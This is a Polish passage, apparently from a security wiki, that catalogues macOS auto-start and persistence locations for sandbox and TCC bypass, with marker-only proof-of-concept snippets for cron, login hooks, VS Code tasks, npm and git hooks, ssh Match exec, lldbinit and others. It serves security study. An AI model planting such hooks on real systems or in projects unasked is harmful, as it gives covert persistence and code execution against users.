Te ścieżki dotyczą starszych pakietów `.qlgenerator`; [przewodnik Apple po architekturze Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) opisuje kolejność wyszukiwania i dopasowywanie typów plików. Obecne **rozszerzenia aplikacji** Quick Look są dołączane do aplikacji i podlegają innym zasadom rejestracji oraz uruchamiania. Sama obecność generatora nie oznacza, że zostanie on wybrany do obsługi danego typu ani że jego kod zostanie uruchomiony w samym Finderze. Ścieżkę starszych generatorów sprawdzono na podstawie dokumentacji i obecności katalogów; na komputerze Mac użytym do badań nie zainstalowano ani nie załadowano żadnego generatora.

### ~~Hooki logowania/wylogowania~~

> [!CAUTION]
> U mnie to nie zadziałało ani z LoginHook użytkownika, ani z LogoutHook roota

**Opis**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- Musisz móc wykonać coś w rodzaju `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - `Lo`cated w `~/Library/Preferences/com.apple.loginwindow.plist`

Są przestarzałe, ale można ich użyć do wykonywania poleceń, gdy użytkownik się loguje.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

To ustawienie jest przechowywane w `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Aby to usunąć:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Użytkownika root zapisano w **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Warunkowy Sandbox Bypass

> [!TIP]
> Tutaj znajdziesz lokalizacje startowe przydatne do **sandbox bypass**, które pozwalają po prostu wykonać coś przez **zapisanie tego do pliku** i **liczenie na niezbyt typowe warunki**, takie jak zainstalowane konkretne **programy, „nietypowe” działania użytkownika** lub środowiska.

### Cron

**Opis**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak mieć możliwość wykonania pliku binarnego `crontab`
  - Albo być rootem
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/usr/lib/cron/tabs/`**
  - Bezpośredni zapis wymaga uprawnień roota. Uprawnienia roota nie są wymagane, jeśli możesz wykonać `crontab <file>`
  - **Wyzwalacz**: Harmonogram w zainstalowanym crontabie. `at` i `periodic` to opisane poniżej odrębne mechanizmy.

#### Opis i wykorzystanie

Wyświetl zadania cron **bieżącego użytkownika** za pomocą:

```bash
crontab -l
```

Plik plist launchd systemowego demona cron zawiera wpis `QueueDirectories` dla `/usr/lib/cron/tabs`; tam przechowywane są zainstalowane crontaby użytkowników. Przeglądanie crontabów innych użytkowników wymaga uprawnień root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

Na tymczasowym koncie można dodać za pomocą `crontab` wpis użytkownika cron zawierający wyłącznie znacznik, a po jego zaobserwowaniu usunąć go. Uruchomienie `crontab <file>` **zastępuje cały istniejący crontab konta**, więc jeśli konto nie jest tymczasowe, zapisz jego zawartość i przywróć ją później:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Opis: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Przydatne do omijania sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 miał przyznane uprawnienia TCC

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Wyzwalacz**: Uruchom iTerm2 ze skryptem Python API znajdującym się w tym folderze i spełniającym wymagania
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Wyzwalacz**: Uruchom iTerm2; hook startowy AppleScript jest opisany osobno
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Wyzwalacz**: Utwórz sesję z profilem, którego polecenie lub tekst początkowy uruchamia payload

#### Description & Exploitation

[Obecny przewodnik iTerm2 Python API](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) opisuje automatycznie uruchamiane skrypty **Python** w `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Nie potwierdza, że dowolny wykonywalny plik `.sh` w tym folderze zostanie uruchomiony. Na koncie tymczasowym zapisz ten skrypt jako `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[Aktualny przewodnik AppleScript dla iTerm2](https://iterm2.com/documentation-scripting.html) osobno opisuje `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, z awaryjną obsługą starszej ścieżki `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`, gdy nowszy folder nie istnieje. AppleScript zawierający wyłącznie znacznik wygląda tak:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Te przykłady skryptów sprawdzono z dokumentacją iTerm2, ale nie uruchamiano ich w aktywnej sesji pulpitu. Po przetestowaniu na koncie tymczasowym usuń skrypt testowy oraz odpowiednio `/tmp/ht-iterm-autolaunch-marker` lub `/tmp/iterm2-autolaunchscpt`.

Ustawienia iTerm2 znajdujące się w **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogą określać polecenie profilu lub tekst początkowy. Ten drugi jest wpisywany w sesji; jego wykonanie zależy od tego, czy zinterpretuje go powłoka. [Dokumentacja profili iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) opisuje polecenie uruchamiane przy tworzeniu nowej sesji z tym profilem.

To ustawienie można skonfigurować w ustawieniach iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Polecenie jest odzwierciedlone w ustawieniach:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

For bezpiecznej oceny sprawdź wybrany profil w ustawieniach iTerm2 lub odczytaj kopię jego pliku preferencji. Zmiana `Initial Text` w aktywnym profilu wpłynęłaby na sesje użytkownika, dlatego na Macu badawczym nie zmieniono żadnych preferencji.

### xbar

Opis: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Jednak xbar musi być zainstalowany
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - Prosi o uprawnienia Accessibility

#### Lokalizacja

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Wyzwalacz**: Po uruchomieniu xbar

#### Opis

Jeśli popularny program [**xbar**](https://github.com/matryer/xbar) jest zainstalowany, można napisać skrypt powłoki w **`~/Library/Application\ Support/xbar/plugins/`**, który zostanie wykonany po uruchomieniu xbar:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Opis techniczny**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Hammerspoon musi być jednak zainstalowany
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga uprawnień Accessibility

#### Lokalizacja

- **`~/.hammerspoon/init.lua`**
  - **Wyzwalacz**: Po uruchomieniu Hammerspoon

#### Opis

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) to platforma automatyzacji dla **macOS**, wykorzystująca do działania **język skryptowy LUA**. Obsługuje też integrację pełnego kodu AppleScript i wykonywanie skryptów powłoki, co znacznie rozszerza jej możliwości skryptowe.<sup>[[13]](#references)</sup>

Aplikacja wyszukuje jeden plik, `~/.hammerspoon/init.lua`. Skrypt zostaje wykonany po uruchomieniu aplikacji.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - BetterTouchTool musi być jednak zainstalowany
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga uprawnień Automation-Shortcuts i Accessibility

#### Lokalizacja

- Plik skryptu **już wskazany** przez włączony preset BetterTouchTool lub konfiguracja tego presetu w `~/Library/Application Support/BetterTouchTool/`. Dokładna ścieżka do skryptu zależy od konfiguracji presetu.

[Dokumentacja akcji BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) opisuje akcje skryptów powłoki i poleceń działających w tle. Skonfigurowane zdarzenie klawiatury, myszy, touchpada, widgetu lub inne musi wystąpić, gdy odpowiedni preset jest aktywny; [przewodnik po wyzwalaczach](https://docs.folivora.ai/docs/configuration/new-trigger/) pokazuje, jak je powiązać. Losowy plik w katalogu obsługiwanego przez aplikację nie jest wyzwalaczem. Skonfigurowana już akcja, która wczytuje zewnętrzny skrypt z możliwością zapisu, stanowi węższy cel typu write-to-execution. Kod działa na koncie użytkownika BetterTouchTool, zgodnie z faktycznie przyznanymi uprawnieniami macOS. BetterTouchTool nie było zainstalowane w `/Applications` na Macu użytym do badań, więc lokalnie nie zmieniono ani nie uruchomiono żadnego presetu.

### Alfred

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Alfred musi być jednak zainstalowany
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
  - Wymaga uprawnień Automation, Accessibility, a nawet Full-Disk access

#### Lokalizacja

- Skrypt lub plik **już wskazany** przez zainstalowany workflow Alfreda albo ten workflow w skonfigurowanym przez użytkownika katalogu `Alfred.alfredpreferences`. Katalog preferencji może być synchronizowany; nie istnieje jedna stała, uniwersalna ścieżka.

[Przewodnik po workflow Alfreda](https://www.alfredapp.com/help/workflows/) opisuje wymóg Powerpack i instalację za pomocą interfejsu użytkownika. Musi zadziałać hotkey, keyword lub inny skonfigurowany wyzwalacz zainstalowanego workflow; [przykład hotkeya Alfreda](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) pokazuje akcję skryptu. [Dokumentacja środowiska Alfreda](https://www.alfredapp.com/help/workflows/script-environment-variables/) udostępnia wybraną ścieżkę preferencji jako `alfred_preferences`. Umieszczenie niezarejestrowanego pliku workflow w dowolnym katalogu nie dowodzi, że zostanie on zainstalowany lub uruchomiony. Kod działa na koncie zalogowanego użytkownika Alfreda, zgodnie z faktycznie przyznanymi uprawnieniami macOS. Alfred nie był zainstalowany w `/Applications` na Macu użytym do badań, dlatego tę ścieżkę oceniono wyłącznie na podstawie dokumentacji.

### Raycast Script Commands i odświeżanie rozszerzeń

- **Cel zapisu:** Skrypt wykonywalny w katalogu **już dodanym** w Raycast Settings → Script Commands. Raycast nie skanuje dowolnego nowo utworzonego katalogu. [Przewodnik Raycast dotyczący Script Commands](https://manual.raycast.com/script-commands) opisuje rejestrację katalogu.
- **Wyzwalacz i tożsamość:** Użytkownik uruchamia zindeksowane polecenie, skonfigurowany hotkey lub fallback je wywołuje albo Raycast odświeża skrypt `inline` zgodnie z jego skonfigurowanym `@raycast.refreshTime`. Skrypt działa jako zalogowany użytkownik Raycast za pośrednictwem interpretera. [Dokumentacja metadanych upstream](https://github.com/raycast/script-commands#metadata) ogranicza automatyczne odświeżanie do poleceń inline, a [manifest rozszerzeń Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) osobno obsługuje `interval` dla zainstalowanych poleceń rozszerzeń typu `no-view` lub `menu-bar`. Samo dodanie zwykłego polecenia skryptowego nie ustawia jego harmonogramu.

Dla tymczasowego konta z zarejestrowanym katalogiem skryptów przykładowy skrypt inline, który zapisuje wyłącznie znacznik, wygląda następująco:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Zapisz go w zarejestrowanym katalogu, nadaj mu uprawnienia do wykonywania i pozwól Raycast odświeżyć listę. Następnie usuń ten plik oraz `/tmp/ht-raycast-refresh-marker`. Na komputerze Mac używanym do badań Raycast nie został znaleziony pod zwyczajową nazwą w `/Applications`, więc opis ten opiera się na dokumentacji i nie został lokalnie uruchomiony. Dostępność, automatyzacja i uprawnienia do plików nadal zależą od monitów o pozwolenie w macOS.

### Automatyczne zadania obszaru roboczego Visual Studio Code

- **Plik docelowy:** `.vscode/tasks.json` w obszarze roboczym, który użytkownik otworzy.
- **Wyzwalacz:** Otwarcie tego obszaru roboczego w VS Code, ale tylko wtedy, gdy folder jest zaufany **i** zezwolono na automatyczne zadania. Niezaufany obszar roboczy nigdy nie uruchamia automatycznych zadań; domyślne ustawienie wyświetla monit przed pierwszym automatycznym uruchomieniem. [Dokumentacja zadań VS Code](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) i [dokumentacja zaufania do obszaru roboczego](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) opisują oba te warunki.
- **Tożsamość wykonania:** konto użytkownika VS Code, za pośrednictwem skonfigurowanego procesu zadania. To wykonywanie właściwe dla aplikacji, a nie mechanizm utrzymywania dostępu po zalogowaniu.

W **nowym, jednorazowym obszarze roboczym** umieść w `.vscode/tasks.json` to zadanie, które tworzy wyłącznie plik znacznikowy:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Po otwarciu zaufanego workspace i zezwoleniu na automatyczne zadania sprawdź, czy istnieje plik `.autostart-task-ran`. Usuń wpis zadania i znacznik, aby posprzątać. **Zweryfikowano to na podstawie dokumentacji Microsoftu i zainstalowanego pakietu VS Code 1.139.1; nie uruchamiano tego w aktywnej sesji pulpitu.**

### Hosty native messaging Chrome

- **Cel zapisu:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` dla bieżącego użytkownika lub `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` dla wszystkich użytkowników (wymagane uprawnienia administratora do zapisu). Chromium i Chrome for Testing używają różnych katalogów; zobacz [aktualną tabelę ścieżek Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Wyzwalacz:** Zainstalowane rozszerzenie Chrome z uprawnieniem `nativeMessaging` wywołuje `chrome.runtime.connectNative()` lub `chrome.runtime.sendNativeMessage()` z dokładną nazwą hosta podaną w manifeście. Chrome uruchamia wtedy plik wykonywalny hosta. Samo otwarcie Chrome nie uruchamia dowolnego nowego hosta native; utworzenie manifestu bez rozszerzenia, które go wywołuje, nic nie robi. [Przewodnik Chrome dotyczący native messaging](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) opisuje ten handshake.
- **Tożsamość wykonania:** konto użytkownika Chrome. Manifest musi podawać bezwzględną ścieżkę do pliku wykonywalnego i jawnie zezwalać na pochodzenie wywołującego rozszerzenia.

Na jednorazowym koncie przeglądarki z testowym rozszerzeniem poniższa para plików demonstruje powiązanie zapisu z wykonaniem. Nazwa pliku manifestu musi być zgodna z jego polem `name`, a `TEST_EXTENSION_ID` należy zastąpić rzeczywistym identyfikatorem tego rozszerzenia:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Zapisz ten JSON jako `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Plik wykonywalny zawierający wyłącznie znacznik, wskazany przez `path` w manifeście, może zawierać:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Gdy testowe rozszerzenie wywoła `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` z service workera lub strony rozszerzenia, znacznik potwierdzi, że host został uruchomiony. Ten minimalny host nie implementuje protokołu odpowiedzi Chrome z prefiksem długości, więc po zapisaniu znacznika rozszerzenie może zgłosić błąd komunikacji. Usuń manifest testowy, hosta i znacznik, aby posprzątać. W macOS 26.5.2 aplikacja Chrome i oba katalogi manifestów były obecne; **aktywny profil Chrome nie został zmodyfikowany ani użyty**.

### Polecenia zdarzeń klawiszy Karabiner-Elements

- **Cel zapisu:** `~/.config/karabiner/karabiner.json` na koncie, na którym zainstalowano i uruchomiono Karabiner-Elements. [Przewodnik Karabiner dotyczący lokalizacji pliku](https://karabiner-elements.pqrs.org/docs/json/location/) podaje, że aplikacja obserwuje ten plik i wczytuje go ponownie po zapisie. Pliki JSON w `assets/complex_modifications` to jedynie gotowe ustawienia do zaimportowania; samo zapisanie tam pliku nie włącza reguły.
- **Wyzwalacz:** Skonfigurowane zdarzenie klawisza po aktywowaniu reguły. [Dokumentacja `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) opisuje wykonywanie poleceń. Nie jest to wykonywanie kodu przy logowaniu ani przy każdym zapisie pliku.
- **Tożsamość wykonania:** Zalogowany użytkownik, którego proces użytkownika Karabiner jest uruchomiony. Uprawnienia aplikacji i dostęp TCC zależą od aplikacji i wersji.

Na jednorazowym koncie testowym dodaj ten obiekt reguły do tablicy `complex_modifications.rules` wybranego profilu w `karabiner.json`, zachowując pozostałą zawartość tego profilu. Naciśnij F18, aby utworzyć nieszkodliwy znacznik, a następnie usuń tę regułę i znacznik. Wybór F18 pozwala uniknąć zastąpienia zwykłego klawisza do pisania:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements nie był zainstalowany w `/Applications` na maszynie testowej z macOS 26.5.2, więc jest to PoC poparty dokumentacją, a nie wynik lokalnego uruchomienia.

### Git hooks w lokalnym repozytorium

- **Cel zapisu:** wykonywalny hook, taki jak `<repo>/.git/hooks/post-checkout`. Jeśli `core.hooksPath` został już ustawiony, użyj zamiast tego skonfigurowanego katalogu. Hook zatwierdzony jako zwykły śledzony plik źródłowy nie jest automatycznie instalowany w klonie.
- **Wyzwalacz:** odpowiednia operacja Git. Na przykład `post-checkout` uruchamia się po `git checkout` lub `git switch`, a także po sklonowaniu repozytorium lub utworzeniu worktree. [Dokumentacja hooków Git](https://git-scm.com/docs/githooks) zawiera listę zdarzeń i wymóg ustawienia bitu wykonywalności; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) zmienia katalog wyszukiwania.
- **Tożsamość wykonania:** konto uruchamiające Git. Hook może się wykonać tylko wtedy, gdy katalog hooków używany przez repozytorium jest zapisywalny dla wykonującego operację, a użytkownik później wykona odpowiednią operację Git.

To PoC ograniczone do znacznika tworzy całkowicie tymczasowe repozytorium, instaluje jeden hook i przełącza gałąź. Zostało pomyślnie wykonane za pomocą Apple Git 2.50.1 w macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### Skrypty cyklu życia npm w projekcie

- **Cel zapisu:** Mapa `scripts` w zapisywalnym pliku projektu `package.json` lub pakietu zainstalowanej zależności, którego skrypt cyklu życia uruchomi użytkownik. To hook przepływu pracy programistycznej, a nie wykonywanie kodu przy otwieraniu katalogu.
- **Wyzwalacz i tożsamość:** Późniejsze `npm install` lub `npm ci`, jeśli skrypty cyklu życia są dozwolone, uruchamia `preinstall`, `install` i `postinstall` jako użytkownik wywołujący npm. Zwykłe `npm run <name>` uruchamia też pasujące skrypty `pre<name>` i `post<name>`. [Dokumentacja zdarzeń cyklu życia npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) zawiera ich listę; opcja [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) może wyłączyć skrypty cyklu życia instalacji. Ustawienia wersji i polityki mogą zmieniać to, co jest dozwolone, dlatego sprawdź wersję npm w środowisku docelowym.

Ten PoC zapisujący wyłącznie znacznik został uruchomiony przy użyciu lokalnego npm w tymczasowym, pustym katalogu. Nie pobiera zależności ani nie modyfikuje projektu użytkownika:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

To różni się od plików startowych interpretera Python: npm musi wykonać odpowiednią operację instalacji lub uruchomienia, natomiast kod `site` w Pythonie może zostać załadowany przy zwykłym uruchomieniu interpretera. Ogólne cele `Makefile` i definicje zadań kompilacji również wymagają, aby użytkownik lub skonfigurowane już narzędzie wywołało dany cel; nie są odrębnymi ścieżkami autostartu systemu operacyjnego.

### Konfiguracja startowa Vim

- **Cel zapisu:** `~/.vimrc` użytkownika, który będzie uruchamiał Vim (lub inny plik startowy wybrany zgodnie z kolejnością inicjalizacji Vim). [Dokumentacja startowa Vim](https://vimhelp.org/starting.txt.html) opisuje ten plik oraz nadpisania `VIMINIT`/`EXINIT`.
- **Wyzwalacz:** Kolejne zwykłe uruchomienie Vim, które ładuje tę konfigurację. Opcja `-u NONE` pomija vimrc użytkownika. To wykonanie specyficzne dla edytora, a nie wyzwalane logowaniem do systemu operacyjnego.
- **Tożsamość wykonania:** Konto użytkownika Vim.

Poniższy odizolowany PoC uruchomiono z użyciem `/usr/bin/vim` w macOS; nie zapisuje on żadnych rzeczywistych preferencji Vim ani otwartych dokumentów:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim ma oddzielną ścieżkę konfiguracji użytkownika: `$XDG_CONFIG_HOME/nvim/init.lua` lub `init.vim`, a także ładuje skrypty z katalogów runtime `plugin/`, zgodnie z [dokumentacją uruchamiania](https://neovim.io/doc/user/starting/). Neovim nie był zainstalowany na maszynie testowej z macOS 26.5.2, więc ten wariant nie został tam uruchomiony.

### Polecenia konfiguracji klienta SSH

- **Miejsce zapisu:** `~/.ssh/config` lub inny plik, który już jest dołączany. Jest to plik konfiguracji **klienta**; jest oddzielny od pliku po stronie serwera `~/.ssh/rc`, opisanego poniżej.
- **Wyzwalacz:** pasujące wywołanie `ssh`. `Match exec` uruchamia lokalne polecenie podczas przetwarzania konfiguracji przez klienta, także przy `ssh -G`, które wyświetla konfigurację bez nawiązywania połączenia. `ProxyCommand` uruchamia się podczas zestawiania przez klienta pasującego połączenia. `LocalCommand` uruchamia się dopiero po pomyślnym nawiązaniu połączenia i wymaga `PermitLocalCommand yes` (domyślnie ustawione jest `no`). Mechanizmy te różnią się momentem uruchomienia i wymaganiami wstępnymi; sam zapis pliku ich nie uruchamia. Zobacz dokumentację upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Tożsamość wykonania:** lokalny użytkownik uruchamiający `ssh`. Wymagane są pasujący host, właściwy plik konfiguracji i, jeśli potrzeba, połączenie. `ssh -F` pozwala wskazać inny plik konfiguracji.

To PoC zapisujące wyłącznie znacznik uruchomiono przy użyciu klienta SSH firmy Apple w macOS 26.5.2. `-G` sprawdza działanie `Match exec` bez nawiązywania połączenia sieciowego ani odczytywania rzeczywistej konfiguracji SSH użytkownika:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Pliki inicjalizacyjne debuggera

- **Cel zapisu:** `~/.lldbinit` lub plik specyficzny dla aplikacji o wyższym priorytecie, taki jak `~/.lldbinit-lldb`. LLDB odczytuje jeden plik podczas uruchamiania debuggera. Plik `.lldbinit` w bieżącym katalogu **nie** jest domyślnie wykonywany; użytkownik musi włączyć `target.load-cwd-lldbinit` lub przekazać `--local-lldbinit`. Zobacz [podręcznik LLDB](https://lldb.llvm.org/man/lldb.html).
- **Wyzwalacz i tożsamość:** Użytkownik uruchamia LLDB bez `--no-lldbinit`; polecenia są wykonywane jako ten użytkownik. Samo otwarcie projektu nie oznacza, że zostanie uruchomiony jego plik `.lldbinit`.

Poniższy test, zawierający wyłącznie znaczniki, przeprowadzono w LLDB na macOS 26.5.2, z odizolowanym katalogiem domowym i roboczym:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**, [dokumentacja uruchamiania upstream](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) wymienia `$HOME/Library/Preferences/gdb/gdbinit`, a następnie `~/.gdbinit` w systemie macOS. Plik `.gdbinit` w bieżącym katalogu podlega ustawieniu [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), a opcje `-nx`/`-nh` wyłączają pliki inicjalizacyjne. GDB nie był zainstalowany na testowym Macu, więc ten wariant nie został przetestowany lokalnie.

### SSHRC

Opis: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - SSH musi być włączone i używane
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
  - SSH używane do uzyskania dostępu FDA

#### Lokalizacja

- **`~/.ssh/rc`**
  - **Wyzwalacz**: Logowanie przez SSH
- **`/etc/ssh/sshrc`**
  - Wymagany root
  - **Wyzwalacz**: Logowanie przez SSH

> [!CAUTION]
> Aby włączyć SSH, wymagany jest Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Opis i wykorzystanie

Domyślnie, o ile w `/etc/ssh/sshd_config` nie ustawiono `PermitUserRC no`, po **zalogowaniu użytkownika przez SSH** zostaną wykonane skrypty **`/etc/ssh/sshrc`** i **`~/.ssh/rc`**.<sup>[[14]](#references)</sup>

### **Elementy logowania**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
  - Trzeba jednak wykonać `osascript` z argumentami
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

- **Zarejestrowana aplikacja pomocnicza elementu logowania:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (częsta lokalizacja w dołączonym pakiecie).
  - **Wyzwalacz:** Rejestracja może natychmiast uruchomić aplikację pomocniczą; będzie ona uruchamiana także przy kolejnych logowaniach użytkownika, z zastrzeżeniem zatwierdzenia.
- **Zarejestrowany dołączony agent/daemon:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` lub `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Wyzwalacz:** Zatwierdzony agent może zostać uruchomiony podczas rejestracji i przy kolejnych logowaniach; zatwierdzony daemon uruchamia się podczas startu systemu. Daemon wymaga zatwierdzenia przez administratora.

#### Opis

